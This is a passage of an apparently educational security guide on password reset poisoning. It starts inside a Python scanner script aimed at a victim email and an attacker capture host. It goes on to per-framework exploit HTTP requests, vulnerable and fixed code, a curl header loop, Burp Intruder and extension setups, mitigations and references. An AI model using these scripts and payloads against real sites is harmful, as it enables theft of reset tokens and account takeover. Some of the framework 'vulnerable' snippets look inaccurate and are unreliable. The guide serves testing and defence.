                    "test": f"Header: {header}",
                    "status_code": resp.status_code,
                    "potentially_vulnerable": resp.status_code in [200, 302],
                })
                
                time.sleep(0.5)  # Rate limit respect
                
            except requests.exceptions.RequestException as e:
                print(f"    {header}: ERROR — {e}")

    def test_duplicate_host(self):
        """Test 3: Duplicate Host header"""
        print("\n[*] Test 3: Duplicate Host header")
        
        # requests library doesn't support duplicate headers easily
        # Using raw socket or prepared request
        from urllib3.util.retry import Retry
        
        try:
            # Method: absolute URL with different Host
            resp = requests.post(
                f"{self.target}{self.reset_endpoint}",
                data={"email": self.victim_email},
                headers={
                    "Host": f"{urlparse(self.target).hostname}",
                    "X-Forwarded-Host": self.attacker_host,
                    "X-Host": self.attacker_host,
                },
                allow_redirects=False,
                timeout=10
            )
            
            print(f"    Combined headers: {resp.status_code}")
            
            self.results.append({
                "test": "Duplicate/Combined Host",
                "status_code": resp.status_code,
                "potentially_vulnerable": resp.status_code in [200, 302],
            })
            
        except requests.exceptions.RequestException as e:
            print(f"    [ERROR] {e}")

    def test_url_parameters(self):
        """Test 4: URL parameter injection"""
        print("\n[*] Test 4: URL parameter injection")
        
        params_to_test = [
            ("redirect", f"https://{self.attacker_host}"),
            ("callback", f"https://{self.attacker_host}/callback"),
            ("return_to", f"https://{self.attacker_host}"),
            ("next", f"https://{self.attacker_host}"),
            ("url", f"https://{self.attacker_host}"),
            ("dest", f"https://{self.attacker_host}"),
            ("continue", f"https://{self.attacker_host}"),
        ]
        
        for param_name, param_value in params_to_test:
            try:
                resp = self.session.post(
                    f"{self.target}{self.reset_endpoint}",
                    data={"email": self.victim_email},
                    params={param_name: param_value},
                    allow_redirects=False,
                    timeout=10
                )
                
                status = "✓" if resp.status_code in [200, 302] else "✗"
                print(f"    ?{param_name}=...: {resp.status_code} {status}")
                
                time.sleep(0.3)
                
            except requests.exceptions.RequestException as e:
                print(f"    ?{param_name}: ERROR — {e}")

    def generate_report(self):
        """Generate final report"""
        vulnerable = [r for r in self.results if r.get("potentially_vulnerable")]
        
        report = {
            "target": self.target,
            "victim_email": self.victim_email,
            "attacker_host": self.attacker_host,
            "total_tests": len(self.results),
            "potential_vulnerabilities": len(vulnerable),
            "results": self.results,
            "recommendation": "Check email inbox/mailcatcher for poisoned reset URLs"
        }
        
        report_file = "reset_poisoning_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{'='*60}")
        print(f" RESULTS SUMMARY")
        print(f"{'='*60}")
        print(f" Total tests:    {len(self.results)}")
        print(f" Potential vulns: {len(vulnerable)}")
        print(f" Report saved:   {report_file}")
        
        if vulnerable:
            print(f"\n [!] POTENTIALLY VULNERABLE VECTORS:")
            for v in vulnerable:
                print(f"     — {v['test']} (HTTP {v['status_code']})")
        
        print(f"\n [*] NEXT STEPS:")
        print(f"     1. Check victim's email for poisoned reset link")
        print(f"     2. Verify attacker server received the token")
        print(f"     3. Confirm token works on the real reset endpoint")
        print(f"{'='*60}")
        
        return report

    def run_all(self):
        """Execute all tests"""
        print(f"{'='*60}")
        print(f" Password Reset Poisoning Scanner")
        print(f" Target:  {self.target}")
        print(f" Victim:  {self.victim_email}")
        print(f" Capture: {self.attacker_host}")
        print(f"{'='*60}")
        
        self.test_basic_host_override()
        self.test_header_injection()
        self.test_duplicate_host()
        self.test_url_parameters()
        
        return self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_url> <victim_email> <attacker_host>")
        print(f"Example: {sys.argv[0]} https://target.com victim@target.com evil.attacker.com")
        sys.exit(1)
    
    poisoner = PasswordResetPoisoner(
        target_url=sys.argv[1],
        victim_email=sys.argv[2],
        attacker_host=sys.argv[3]
    )
    poisoner.run_all()
```

::

---

## Framework-Specific Vulnerabilities

::accordion
  :::accordion-item{icon="i-simple-icons-laravel" label="Laravel / PHP"}
  
  Laravel uses the `Host` header in its password reset notification by default.

  ::code-group
  ```http [Exploit Payload]
  POST /forgot-password HTTP/1.1
  Host: attacker-server.com
  Content-Type: application/x-www-form-urlencoded
  X-CSRF-TOKEN: valid_csrf_token

  email=admin@target.com
  ```

  ```php [Vulnerable Code — ResetPassword Notification]
  // Illuminate\Auth\Notifications\ResetPassword
  // The URL is built using url() helper which uses Host header
  
  protected function resetUrl($notifiable)
  {
      // This uses request()->getHost() internally
      return url(route('password.reset', [
          'token' => $this->token,
          'email' => $notifiable->getRouteNotificationFor('mail'),
      ], false));
  }
  ```

  ```php [Fixed — Custom ResetPassword Notification]
  // app/Notifications/CustomResetPassword.php

  use Illuminate\Auth\Notifications\ResetPassword;

  class CustomResetPassword extends ResetPassword
  {
      protected function resetUrl($notifiable)
      {
          // Hardcode the application URL — never trust Host header
          $appUrl = config('app.url'); // Set in .env: APP_URL=https://legitimate-app.com
          
          return $appUrl . route('password.reset', [
              'token' => $this->token,
              'email' => $notifiable->getRouteNotificationFor('mail'),
          ], false);
      }
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-django" label="Django / Python"}
  
  Django's `PasswordResetView` uses `request.get_host()` which can be poisoned.

  ::code-group
  ```http [Exploit Payload]
  POST /accounts/password_reset/ HTTP/1.1
  Host: attacker-server.com
  Content-Type: application/x-www-form-urlencoded

  email=admin@target.com&csrfmiddlewaretoken=valid_token
  ```

  ```python [Vulnerable — Default Django Behavior]
  # Django's PasswordResetForm.save() method
  # Uses request.get_host() to build the reset URL
  
  def save(self, domain_override=None, ...):
      if not domain_override:
          current_site = get_current_site(request)
          site_name = current_site.name
          domain = current_site.domain  # Can come from Host header
  ```

  ```python [Fixed — Hardcoded Domain]
  # settings.py
  ALLOWED_HOSTS = ['legitimate-app.com']  # Strict whitelist

  # views.py — Override with domain_override
  from django.contrib.auth.views import PasswordResetView

  class SecurePasswordResetView(PasswordResetView):
      def form_valid(self, form):
          form.save(
              domain_override='legitimate-app.com',
              use_https=True,
              request=self.request,
          )
          return super().form_valid(form)
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-rubyonrails" label="Ruby on Rails"}
  
  Devise gem uses `request.host` in mailer URL generation.

  ::code-group
  ```http [Exploit Payload]
  POST /users/password HTTP/1.1
  Host: attacker-server.com
  Content-Type: application/x-www-form-urlencoded

  user[email]=admin@target.com&authenticity_token=valid_token
  ```

  ```ruby [Vulnerable — Default Devise Config]
  # config/environments/production.rb
  # If action_mailer.default_url_options uses request host:
  
  config.action_mailer.default_url_options = { 
    host: request.host  # VULNERABLE — trusts Host header
  }
  ```

  ```ruby [Fixed — Hardcoded Host]
  # config/environments/production.rb
  config.action_mailer.default_url_options = { 
    host: 'legitimate-app.com',
    protocol: 'https'
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-express" label="Node.js / Express"}

  ::code-group
  ```http [Exploit Payload]
  POST /auth/forgot-password HTTP/1.1
  Host: attacker-server.com
  Content-Type: application/json

  {"email": "admin@target.com"}
  ```

  ```javascript [Vulnerable Express Code]
  app.post('/auth/forgot-password', async (req, res) => {
    const { email } = req.body;
    const user = await User.findOne({ email });
    
    if (user) {
      const token = crypto.randomBytes(32).toString('hex');
      
      // VULNERABLE — uses req.headers.host
      const resetUrl = `${req.protocol}://${req.headers.host}/reset?token=${token}`;
      
      await sendEmail(email, 'Password Reset', `
        <p>Click to reset: <a href="${resetUrl}">${resetUrl}</a></p>
      `);
    }
    
    res.json({ message: 'If account exists, email sent.' });
  });
  ```

  ```javascript [Fixed Express Code]
  const APP_URL = process.env.APP_URL || 'https://legitimate-app.com';

  app.post('/auth/forgot-password', async (req, res) => {
    const { email } = req.body;
    const user = await User.findOne({ email });
    
    if (user) {
      const token = crypto.randomBytes(32).toString('hex');
      
      // FIXED — hardcoded application URL
      const resetUrl = `${APP_URL}/reset?token=${token}`;
      
      await sendEmail(email, 'Password Reset', `
        <p>Click to reset: <a href="${resetUrl}">${resetUrl}</a></p>
      `);
    }
    
    res.json({ message: 'If account exists, email sent.' });
  });
  ```
  ::
  :::

  :::accordion-item{icon="i-simple-icons-spring" label="Spring Boot / Java"}

  ::code-group
  ```http [Exploit Payload]
  POST /api/auth/forgot-password HTTP/1.1
  Host: attacker-server.com
  X-Forwarded-Host: attacker-server.com
  Content-Type: application/json

  {"email": "admin@target.com"}
  ```

  ```java [Vulnerable Spring Code]
  @PostMapping("/forgot-password")
  public ResponseEntity<?> forgotPassword(
      @RequestBody ForgotPasswordRequest req,
      HttpServletRequest httpRequest) {
      
      String token = UUID.randomUUID().toString();
      tokenService.createToken(req.getEmail(), token);
      
      // VULNERABLE — uses request host
      String host = httpRequest.getHeader("X-Forwarded-Host");
      if (host == null) host = httpRequest.getHeader("Host");
      
      String resetUrl = "https://" + host + "/reset?token=" + token;
      emailService.sendResetEmail(req.getEmail(), resetUrl);
      
      return ResponseEntity.ok("Reset email sent");
  }
  ```

  ```java [Fixed Spring Code]
  @Value("${app.base-url}")  // application.yml: app.base-url: https://legitimate-app.com
  private String appBaseUrl;

  @PostMapping("/forgot-password")
  public ResponseEntity<?> forgotPassword(@RequestBody ForgotPasswordRequest req) {
      
      String token = UUID.randomUUID().toString();
      tokenService.createToken(req.getEmail(), token);
      
      // FIXED — uses configured app URL
      String resetUrl = appBaseUrl + "/reset?token=" + token;
      emailService.sendResetEmail(req.getEmail(), resetUrl);
      
      return ResponseEntity.ok("Reset email sent");
  }
  ```
  ::
  :::
::

---

## Detection & Testing Methodology

### Manual Testing

::steps{level="4"}

#### Map the password reset functionality

Identify the reset endpoint, required parameters, and how the application handles the flow.

```bash [Identify Reset Endpoint]
# Common endpoints to test
/forgot-password
/reset-password
/password/reset
/auth/forgot
/api/auth/forgot-password
/users/password
/account/recover
/password_reset
```

#### Capture a legitimate reset request in Burp Suite

Trigger a normal password reset for a test account and intercept the request.

```http [Normal Request]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
Content-Type: application/x-www-form-urlencoded

email=your-test-account@target.com
```

#### Modify the Host header and resend

Replace the `Host` header with your Burp Collaborator or attacker server domain.

```http [Poisoned Request]
POST /forgot-password HTTP/1.1
Host: YOUR-COLLABORATOR-ID.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=your-test-account@target.com
```

#### Check the email received

Examine the reset email — if the URL contains your Collaborator domain, the application is vulnerable.

```text [Check Email for Poisoned URL]
# Vulnerable response in email:
https://YOUR-COLLABORATOR-ID.burpcollaborator.net/reset?token=secret_token_value

# Not vulnerable:
https://legitimate-app.com/reset?token=secret_token_value
```

#### If basic Host override fails, try override headers

Cycle through all possible header injection vectors.

```bash [Header Testing Script]
# Quick test with curl
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-Original-Host" "Forwarded"; do
  echo "Testing: $header"
  if [ "$header" = "Forwarded" ]; then
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "$TARGET/forgot-password" \
      -H "$header: host=attacker.com" \
      -d "email=test@target.com"
  else
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "$TARGET/forgot-password" \
      -H "$header: attacker.com" \
      -d "email=test@target.com"
  fi
  echo ""
done
```

::

### Automated Testing with Burp Suite

::tabs
  :::tabs-item{icon="i-lucide-settings" label="Burp Intruder Setup"}
  
  Configure Burp Intruder to spray all header vectors automatically.

  ```text [Intruder Configuration]
  Attack Type: Sniper
  
  Position: Header name and value
  
  Base Request:
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  §X-Forwarded-Host§: §attacker-collaborator.com§
  Content-Type: application/x-www-form-urlencoded
  
  email=test@target.com
  
  Payload Set 1 — Header Names:
  X-Forwarded-Host
  X-Host
  X-Forwarded-Server
  X-Original-Host
  X-Proxy-Host
  X-Real-Host
  Forwarded
  X-Custom-Host
  X-Backend-Host
  X-Upstream-Host
  
  Grep Extract: Check response for success indicators
  Monitor: Collaborator tab for incoming connections
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Burp Extension — Python"}
  ::code-collapse

  ```python [burp_reset_poison_scanner.py]
  """
  Burp Suite Extension — Password Reset Poisoning Scanner
  Automatically tests password reset endpoints for Host header poisoning
  """
  
  from burp import IBurpExtender, IScannerCheck, IScanIssue
  from java.net import URL
  import re
  
  class BurpExtender(IBurpExtender, IScannerCheck):
      
      POISON_HEADERS = [
          ("X-Forwarded-Host", "{collaborator}"),
          ("X-Host", "{collaborator}"),
          ("X-Forwarded-Server", "{collaborator}"),
          ("X-Original-Host", "{collaborator}"),
          ("Forwarded", "host={collaborator}"),
          ("X-Proxy-Host", "{collaborator}"),
      ]
      
      RESET_KEYWORDS = [
          'forgot', 'reset', 'password', 'recover',
          'restore', 'lost', 'account/password'
      ]
      
      def registerExtenderCallbacks(self, callbacks):
          self._callbacks = callbacks
          self._helpers = callbacks.getHelpers()
          callbacks.setExtensionName("Password Reset Poisoner")
          callbacks.registerScannerCheck(self)
      
      def doPassiveScan(self, baseRequestResponse):
          return None
      
      def doActiveScan(self, baseRequestResponse, insertionPoint):
          request_info = self._helpers.analyzeRequest(baseRequestResponse)
          url = str(request_info.getUrl())
          
          # Check if this is a password reset endpoint
          if not any(kw in url.lower() for kw in self.RESET_KEYWORDS):
              return None
          
          issues = []
          
          for header_name, header_value in self.POISON_HEADERS:
              # Generate collaborator payload
              collab = self._callbacks.createBurpCollaboratorClientContext()
              payload = collab.generatePayload(True)
              value = header_value.replace("{collaborator}", payload)
              
              # Build modified request with poison header
              request = baseRequestResponse.getRequest()
              request_str = self._helpers.bytesToString(request)
              
              # Insert header
              headers = request_info.getHeaders()
              headers.add(f"{header_name}: {value}")
              
              body = request_str[request_info.getBodyOffset():]
              modified = self._helpers.buildHttpMessage(headers, body)
              
              # Send request
              response = self._callbacks.makeHttpRequest(
                  baseRequestResponse.getHttpService(),
                  modified
              )
              
              # Check for collaborator interactions
              interactions = collab.fetchAllCollaboratorInteractions()
              if interactions:
                  issues.append(self._create_issue(
                      baseRequestResponse, header_name, payload
                  ))
          
          return issues if issues else None
      
      def _create_issue(self, base, header, payload):
          return CustomScanIssue(
              base.getHttpService(),
              self._helpers.analyzeRequest(base).getUrl(),
              [base],
              "Password Reset Poisoning",
              f"The application is vulnerable to password reset poisoning via the {header} header.",
              "High"
          )
  ```

  ::
  :::
::

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Hardcode Application URL
  icon: i-lucide-lock
  ---
  **Never** use the `Host` header to construct URLs in emails. Use a server-side configuration value like `APP_URL`, `BASE_URL`, or `config('app.url')`.
  ::

  ::card
  ---
  title: Whitelist Host Headers
  icon: i-lucide-list-checks
  ---
  Configure your web server and application to **reject requests** with unexpected `Host` header values. Use `ALLOWED_HOSTS` in Django, `trustedProxies` in Laravel.
  ::

  ::card
  ---
  title: Ignore Override Headers
  icon: i-lucide-shield-off
  ---
  Strip or ignore `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, and similar headers unless behind a **trusted** reverse proxy that sets them.
  ::

  ::card
  ---
  title: Token Expiration
  icon: i-lucide-timer
  ---
  Set aggressive expiration on reset tokens (15-30 minutes max). Invalidate tokens immediately after use. Limit to single-use only.
  ::

  ::card
  ---
  title: Token Binding
  icon: i-lucide-fingerprint
  ---
  Bind reset tokens to additional context — IP address, User-Agent fingerprint, or require the user to also enter their email on the reset page.
  ::

  ::card
  ---
  title: Rate Limiting
  icon: i-lucide-gauge
  ---
  Implement strict rate limiting on the password reset endpoint — limit to 3-5 requests per email per hour to prevent token grinding attacks.
  ::
::

### Secure Implementation Example

::code-group
```python [Django — Secure Reset]
# settings.py
ALLOWED_HOSTS = ['legitimate-app.com', 'www.legitimate-app.com']
APP_BASE_URL = 'https://legitimate-app.com'

# views.py
from django.conf import settings

class SecurePasswordResetView(PasswordResetView):
    def form_valid(self, form):
        form.save(
            domain_override=urlparse(settings.APP_BASE_URL).hostname,
            use_https=settings.APP_BASE_URL.startswith('https'),
            request=self.request,
        )
        return super().form_valid(form)
```

```javascript [Express — Secure Reset]
// Hardcoded — never from request headers
const APP_URL = process.env.APP_URL; // https://legitimate-app.com

app.post('/forgot-password', rateLimit({max: 5, windowMs: 3600000}), async (req, res) => {
  const user = await User.findByEmail(req.body.email);
  
  if (user) {
    const token = crypto.randomBytes(32).toString('hex');
    const expiry = Date.now() + 30 * 60 * 1000; // 30 min
    
    await ResetToken.create({
      userId: user.id,
      token: await bcrypt.hash(token, 12), // Hash stored token
      expiresAt: expiry,
      ip: req.ip,
      used: false
    });
    
    // URL from config — NOT from request
    const resetUrl = `${APP_URL}/reset-password?token=${token}&email=${user.email}`;
    await sendEmail(user.email, resetUrl);
  }
  
  // Same response regardless — prevent enumeration
  res.json({ message: 'If an account exists, a reset link was sent.' });
});
```

```php [Laravel — Secure Reset]
<?php
// config/app.php
'url' => env('APP_URL', 'https://legitimate-app.com'),

// app/Notifications/SecureResetPassword.php
class SecureResetPassword extends ResetPassword
{
    protected function resetUrl($notifiable)
    {
        // Always use configured APP_URL
        return config('app.url') . route('password.reset', [
            'token' => $this->token,
            'email' => $notifiable->getRouteNotificationFor('mail'),
        ], false);
    }
}

// Also in TrustProxies middleware — restrict trusted proxies
// app/Http/Middleware/TrustProxies.php
protected $proxies = ['10.0.0.1']; // Only your actual load balancer
protected $headers = Request::HEADER_X_FORWARDED_FOR; // Limit which headers to trust
```
::

---

## References & Resources

::card-group
  ::card
  ---
  title: PortSwigger — Password Reset Poisoning
  icon: i-lucide-flask-conical
  to: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
  target: _blank
  ---
  Detailed lab-based walkthrough of Password Reset Poisoning via Host header manipulation.
  ::

  ::card
  ---
  title: OWASP — Forgot Password Cheat Sheet
  icon: i-lucide-book-open
  to: https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
  target: _blank
  ---
  OWASP secure implementation guidelines for password reset functionality and token handling.
  ::

  ::card
  ---
  title: CWE-640 — Weak Password Recovery
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/640.html
  target: _blank
  ---
  MITRE CWE entry for weak password recovery mechanisms — classification and observed examples.
  ::

  ::card
  ---
  title: HackTricks — Reset Password
  icon: i-lucide-terminal
  to: https://book.hacktricks.wiki/en/pentesting-web/reset-password.html
  target: _blank
  ---
  Comprehensive practical guide covering multiple password reset attack techniques and bypasses.
  ::

  ::card
  ---
  title: PortSwigger — Host Header Attacks
  icon: i-lucide-search
  to: https://portswigger.net/web-security/host-header
  target: _blank
  ---
  Full coverage of HTTP Host header attacks including password reset poisoning, SSRF, and cache poisoning.
  ::

  ::card
  ---
  title: OWASP WSTG — Session Management
  icon: i-lucide-clipboard-check
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/
  target: _blank
  ---
  OWASP Web Security Testing Guide — complete session and authentication testing methodology.
  ::

  ::card
  ---
  title: Skeletonscribe — Host Header Research
  icon: i-lucide-file-text
  to: https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
  target: _blank
  ---
  Original research paper on practical HTTP Host header attacks including password reset poisoning.
  ::

  ::card
  ---
  title: Bug Bounty Reports — Password Reset
  icon: i-lucide-bug
  to: https://github.com/KathanP19/HowToHunt/blob/master/Authentication/Password_Reset_Flaws.md
  target: _blank
  ---
  Community-curated collection of real-world password reset vulnerability findings from bug bounty programs.
  ::
::

::tip{to="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning"}
Practice this attack safely using the **PortSwigger Web Security Academy** free labs — they provide realistic vulnerable environments specifically designed for Host header password reset poisoning.
::